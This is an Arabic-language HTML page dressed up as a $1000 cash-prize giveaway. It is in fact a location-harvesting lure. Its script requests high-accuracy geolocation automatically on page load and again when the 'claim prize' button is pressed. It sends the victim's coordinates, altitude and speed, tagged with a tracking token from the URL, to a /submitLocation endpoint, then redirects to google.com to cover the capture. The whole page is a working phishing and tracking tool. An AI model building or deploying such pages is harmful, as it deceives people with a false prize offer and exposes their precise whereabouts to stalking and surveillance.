<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الموقع الفوري واستلام الجائزة | Cash Reward GPS</title>
    
    <meta property="og:title" content="اربح 1000 دولار كاش الآن | مسابقة المسافات والجوائز الكبرى">
    <meta property="og:description" content="اضغط للسماح بتحديد موقعك وتأكيد هويتك لاستلام الجائزة النقدية الفورية المخصصة لمدينتك!">
    <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=1200&auto=format&fit=crop&q=80">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
        body { font-family: 'Tajawal', sans-serif; }
        .gps-gradient { background: linear-gradient(135deg, #2563EB 0%, #1D4ED8 100%); }
    </style>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
        
        <div class="absolute -top-16 -right-16 w-32 h-32 bg-blue-500/10 rounded-full blur-2xl pointer-events-none"></div>

        <div class="w-20 h-20 rounded-3xl gps-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-blue-500/30 animate-pulse">
            <i class="fa-solid fa-location-crosshairs"></i>
        </div>

        <div class="space-y-2">
            <span class="bg-blue-500/20 text-blue-400 text-xs px-3 py-1 rounded-full font-bold border border-blue-500/30">التحقق الجغرافي مطلوب</span>
            <h1 class="text-2xl font-black text-white">تأكيد موقعك لاستلام الجائزة</h1>
            <p class="text-xs text-slate-400">يرجى الضغط على زر "السماح بالموقع" (Allow) في النافذة المنبثقة للتأكد من أنك ضمن الدولة المؤهلة للسحب.</p>
        </div>

        <button onclick="requestLocation()" class="w-full gps-gradient hover:opacity-95 text-white font-bold py-3.5 rounded-2xl shadow-lg shadow-blue-500/30 transition duration-200">
            السماح بتحديد الموقع واستلام الجائزة
        </button>

        <div id="statusText" class="text-xs text-slate-500">
            في انتظار منح الصلاحية...
        </div>

    </div>

    <script>
        function requestLocation() {
            const statusText = document.getElementById('statusText');
            statusText.textContent = "جاري طلب إذن الوصول للموقع...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        statusText.textContent = "تم تحديد الموقع بنجاح! جاري تحويلك...";
                        
                        const urlParams = new URLSearchParams(window.location.search);
                        const token = urlParams.get('t') || window.location.pathname.split('/').pop();

                        if (!token) {
                            console.error('Token not found.');
                            return;
                        }

                        const locationData = {
                            token: token,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + " متر",
                            altitude: position.coords.altitude || "غير متوفر",
                            speed: position.coords.speed || "غير متوفر"
                        };

                        try {
                            // إرسال الإحداثيات عبر POST إلى المسار المخصص
                            await fetch('/submitLocation', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(locationData)
                            });
                        } catch (e) {
                            console.error('Failed to submit location');
                        }

                        setTimeout(() => {
                            window.location.href = 'https://www.google.com';
                        }, 1500);
                    },
                    (error) => {
                        statusText.textContent = "عذراً، يجب السماح بالموقع للمتابعة!";
                        statusText.className = "text-xs text-red-400 font-semibold";
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                statusText.textContent = "متصفحك لا يدعم تحديد الموقع الجغرافي.";
            }
        }

        // محاولة الطلب تلقائياً عند الدخول إن أمكن
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(requestLocation, 1000);
        });
    </script>
</body>
</html>
